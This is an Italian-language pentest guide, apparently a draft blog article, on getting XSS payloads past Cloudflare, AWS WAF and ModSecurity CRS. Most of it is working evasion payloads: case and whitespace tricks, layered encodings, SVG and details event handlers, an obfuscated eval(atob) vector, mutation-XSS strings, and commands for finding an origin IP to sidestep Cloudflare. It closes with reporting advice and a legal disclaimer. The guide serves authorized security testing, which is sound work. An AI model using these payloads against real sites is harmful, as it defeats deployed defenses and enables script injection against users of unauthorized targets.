---
title: 'XSS WAF Bypass: come aggirare Cloudflare, AWS WAF e ModSecurity'
slug: xss-waf-bypass
description: 'Guida pratica ai bypass XSS contro WAF reali: Cloudflare, AWS WAF, ModSecurity CRS, evasione via encoding, payload mutati, origin bypass e tecniche usate nei pentest.'
image: /xss-waf-bypass.webp
draft: true
date: 2026-03-29T00:00:00.000Z
categories:
  - web-hacking
subcategories:
  - owasp
tags:
  - xss
  - waf-bypass
  - modsecurity-crs
---

Un **Web Application Firewall (WAF)** è spesso il primo ostacolo che incontri in un pentest su target di produzione. Cloudflare, AWS WAF, ModSecurity, Imperva, Akamai — tutti usano regole per rilevare e bloccare payload XSS. Nessuno è impenetrabile.

Questa guida copre le tecniche di bypass per i WAF più diffusi, con un approccio metodico: prima capisci il WAF, poi lo aggiri.

→ Torna alla guida principale: [XSS Completo](https://hackita.it/articoli/xss)\
→ Per bypass di filtri applicativi: [XSS Filter Bypass](https://hackita.it/articoli/xss-filter-bypass)

***

## Differenza: Filtro Applicativo vs WAF

|               | Filtro Applicativo           | WAF                                |
| ------------- | ---------------------------- | ---------------------------------- |
| Posizione     | Nel codice dell'app          | Davanti all'app (proxy)            |
| Visibilità    | Nel sorgente / comportamento | Header, blocco HTTP, response code |
| Bypass        | Tecniche encoding, context   | Tecniche evasion a livello HTTP    |
| Aggiornamenti | Dipende dallo sviluppatore   | Automatici (vendor)                |

Il WAF vede la richiesta HTTP prima che arrivi all'applicazione. Blocca o modifica le request che matchano i pattern delle regole. Il tuo obiettivo: far sì che il payload arrivi all'applicazione **senza** matchare le regole.

***

## Identificare il WAF

Prima di tentare bypass, identifica quale WAF stai affrontando.

### wafw00f

```bash
# Installazione
pip3 install wafw00f

# Fingerprint
wafw00f https://target.com

# Output tipico:
# [+] The site https://target.com is behind Cloudflare (Cloudflare Inc.) WAF.
# [+] Generic Detection results:
# [-] No WAF detected by the generic detection
```

### Manuale

* **Risposta 403** con pagina di errore branded → WAF attivo e rilevato
* **Risposta 406 / 501** → WAF che blocca silenziosamente
* Header `Server: cloudflare`, `x-fw-hash`, `x-amzn-requestid` → vendor identificabili
* Risposta identica per tutti i payload → WAF in modalità block totale

### Test di Baseline

Invia un payload ovvio e vedi la risposta:

```
?q=<script>alert(1)</script>
```

Poi invia qualcosa di innocuo:

```
?q=hello
```

Se la prima risposta è 403 e la seconda è 200, il WAF è in modalità attiva.

***

## Tecniche Generali di Evasion

### 1. Case Variation

I WAF basati su regex case-sensitive vengono bypassati con variazioni di maiuscole:

```javascript
<ScRiPt>alert(1)</ScRiPt>
<IMG SRC=x ONERROR=alert(1)>
<sVg/ONloAD=alert(1)>
```

### 2. Whitespace Alternativo

```javascript
// Tab (0x09)
<img	src=x	onerror=alert(1)>

// Newline (0x0A)
<img%0Asrc=x%0Aonerror=alert(1)>

// Carriage return (0x0D)
<img%0Dsrc=x%0Donerror=alert(1)>

// Form feed (0x0C)
<img%0Csrc=x%0Conerror=alert(1)>

// Null byte (0x00) — su alcuni WAF
<sc%00ript>alert(1)</sc%00ript>
```

### 3. Commenti HTML / JS

```javascript
// Commento dentro tag
<img src=x onerror=al/**/ert(1)>
<s<!---->cript>alert(1)</s<!---->cript>

// Commento JS
<script>al//ert
(1)</script>

// Commento condizionale IE
<![if !IE]><script>alert(1)</script><![endif]>
```

### 4. Encoding a Livelli

```javascript
// URL encode singolo
%3Cscript%3Ealert(1)%3C%2Fscript%3E

// Double URL encode
%253Cscript%253Ealert%25281%2529%253C%252Fscript%253E

// HTML entity (efficace in context HTML)
&lt;script&gt;alert(1)&lt;/script&gt;
&#60;script&#62;alert(1)&#60;/script&#62;
&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;

// Unicode
\u003cscript\u003ealert(1)\u003c/script\u003e
```

### 5. Payload Frammentato su Più Parametri

Se il WAF analizza i parametri singolarmente ma l'app li concatena:

```
?a=<script>&b=alert(1)&c=</script>
# Se l'app fa: output = a + b + c
```

### 6. HTTP Parameter Pollution

```
?q=<script>&q=alert(1)&q=</script>
# Dipende da come il framework gestisce duplicati
```

***

## Bypass Cloudflare

Cloudflare WAF usa sia regole managed che machine learning. Il bypass completo non esiste, ma ci sono vettori che passano regolarmente.

### Tecniche che Spesso Passano su Cloudflare

```javascript
// SVG con animazione
<svg><animate onbegin=alert(1) attributeName=x dur=1s>
<svg><set onbegin=alert(1) attributeName=x to=y>

// Details con ontoggle
<details open ontoggle=alert(1)>
<details/open/ontoggle=alert(1)>

// Input con autofocus
<input onfocus=alert(1) autofocus>

// Stringa JavaScript con costruttore
"><script>Function`alert\x281\x29`()</script>

// Template literal senza parentesi
<script>alert`1`</script>

// Object spread
<script>{[]['fill']['constructor']`alert\x281\x29`()}</script>

// Codifiche miste
<ScRiPt/onfoo=bar/OnErRoR=eval(atob`YWxlcnQoMSk=`)>
```

### Cloudflare e Body POST

Cloudflare a volte analizza il body POST meno aggressivamente dei parametri GET. Prova a spostare il payload dal parametro GET al body POST se l'applicazione lo accetta.

### Origin IP Bypass

Se trovi l'IP del server di origine (da subdomain non protetti, certificati SSL, Shodan), puoi fare richieste dirette bypassando Cloudflare completamente:

```bash
# Trova origin IP
shodan search "ssl:target.com"
subfinder -d target.com | httpx -probe  # Cerca subdomain senza CF

# Richiesta diretta all'origin
curl -H "Host: target.com" http://ORIGIN_IP/path?q=<payload>
```

***

## Bypass AWS WAF

AWS WAF usa regole gestite da AWS e regole custom del cliente.

### Tecniche Comuni

```javascript
// Newline nell'attributo
<img%0Asrc%0A=%0Ax%0Aonerror%0A=%0Aalert(1)>

// Separatore null byte
<scr%00ipt>alert(1)</scr%00ipt>

// Encoding misto
<img src=x onerror=&#x61;&#x6C;&#x65;&#x72;&#x74;&#x28;1&#x29;>

// Via header non standard (se il WAF non analizza tutti gli header)
X-Custom-Header: <script>alert(1)</script>
# Se l'app riflette questo header nell'output
```

***

## Bypass ModSecurity (OWASP CRS)

ModSecurity con OWASP Core Rule Set (CRS) è il WAF open source più diffuso. Le regole sono pubbliche — puoi leggere esattamente cosa blocca.

### Analisi delle Regole

```bash
# Regole XSS principali nel CRS
grep -r "xss\|script\|onerror" /etc/modsecurity/rules/REQUEST-941-APPLICATION-ATTACK-XSS.conf
```

### Bypass Specifici CRS

CRS usa livelli di paranoia (1-4). A livello 1 (default) molti bypass passano:

```javascript
// CRS livello 1 — spesso non bloccato
<svg/onload=alert(1)>
<details open ontoggle=alert(1)>

// Bypass tramite case + whitespace
<ImG sRc=x OnErRoR=alert(1)>

// Payload senza parola "script" e senza "<script>"
<body onload=alert(1)>

// Bypass tramite encoding nel context JS (se CRS non analizza il context)
';alert(1)//
```

### Anomaly Scoring

CRS accumula punteggio per ogni match sospetto. Sotto la soglia (default: 5 per inbound), la richiesta passa. Payload che generano score basso passano:

```javascript
// Score basso — solo un pattern sospetto
<x onunknownevent=alert(1)>

// Payload che usa parole non nella blocklist
<video onplaying=alert(1) autoplay src=data:video/mp4,>
```

***

## Automazione: sqlmap Style per XSS

### dalfox con Tamper Scripts

```bash
# Bypass con encoding
dalfox url "https://target.com/search?q=FUZZ" \
    --waf-evasion

# Con header personalizzati
dalfox url "https://target.com/search?q=FUZZ" \
    --header "X-Forwarded-For: 127.0.0.1" \
    --header "User-Agent: Mozilla/5.0"

# Delay tra richieste (evita rate limiting)
dalfox url "https://target.com/search?q=FUZZ" \
    --delay 500
```

### Burp Suite — Intruder con Payload Mutati

1. Invia richiesta a Intruder
2. Seleziona parametro
3. Payload type: "Simple List" con lista XSS base
4. Payload Processing → Add Rule:
   * URL Encode
   * Hash prefix/suffix casuale
5. Analizza response length variation

***

## Tecniche Avanzate: Mutation XSS (mXSS)

mXSS sfrutta il comportamento non deterministico del parser HTML dei browser. Il WAF analizza l'HTML, ma il browser lo interpreta diversamente, eseguendo il payload.

```javascript
// Il WAF vede: testo innocuo dopo parsing
// Il browser ri-parseizza il DOM e genera XSS
<noscript><p title="</noscript><img src=x onerror=alert(1)>">

// Entità HTML che il WAF non esegue ma il browser sì
<svg><desc><![CDATA[</desc><script>alert(1)</script>]]></svg>

// HTML importato con template
<template><img src=x onerror=alert(1)></template>
<script>document.body.appendChild(document.querySelector('template').content)</script>
```

***

## WAF Bypass Cheat Sheet

| WAF             | Tecniche Efficaci                                               |
| --------------- | --------------------------------------------------------------- |
| Cloudflare      | SVG animate, details ontoggle, template literals, origin bypass |
| AWS WAF         | Newline encoding, header reflection, null byte                  |
| ModSecurity CRS | Case+whitespace, eventi non standard, low-score payload         |
| Imperva         | Encoding multipli, chunked encoding, parameter pollution        |
| Generic         | Whitespace alternativo, case variation, polyglot, commenti      |

***

## Nota sul Responsible Disclosure

Quando trovi un bypass WAF su un target, includi nel report:

* Il payload esatto che bypassa il WAF
* La versione/configurazione del WAF (se identificabile)
* L'impatto reale (il WAF era l'unica difesa? L'applicazione ha sanitizzazione propria?)

Un bypass WAF senza XSS applicativo confermato è un finding minore. Un bypass WAF che porta a XSS confermato è Alto/Critico.

***

###### ***Disclaimer: Usa queste tecniche solo su sistemi con autorizzazione esplicita scritta. Attività non autorizzate su sistemi altrui costituiscono reato penale (art. 615-ter c.p.).***

Vuoi migliorare davvero le tue competenze offensive con un percorso **1:1**? Vai su [HackIta Formazione](https://hackita.it/servizi).\
Se invece vuoi testare la sicurezza della tua azienda con un assessment professionale, trovi tutto su [HackIta Servizi](https://hackita.it/servizi).\
Se questo contenuto ti è stato utile e vuoi supportare il progetto, puoi farlo su [HackIta Supporto](https://hackita.it/supporto).\
Per un approfondimento esterno utile anche lato difesa, vedi [OWASP ModSecurity Core Rule Set](https://coreruleset.org/).
